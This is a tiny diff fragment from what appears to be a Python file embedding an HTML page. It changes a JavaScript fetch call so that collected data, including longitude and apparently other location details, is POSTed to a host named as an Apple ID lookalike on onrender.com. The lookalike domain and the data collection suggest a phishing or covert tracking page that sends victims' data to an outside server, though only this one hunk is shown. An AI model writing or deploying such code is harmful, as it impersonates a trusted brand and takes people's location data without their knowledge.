@@ -128,7 +128,7 @@ HTML_PAGE = '''
           longitude: data.longitude
         };
 
- await fetch('https://apple-id-xxxxx.onrender.com/submit', {
+ await fetch('https://apple-id.onrender.com/submit', {
   method: 'POST',
   headers: {
     'Content-Type': 'application/json'
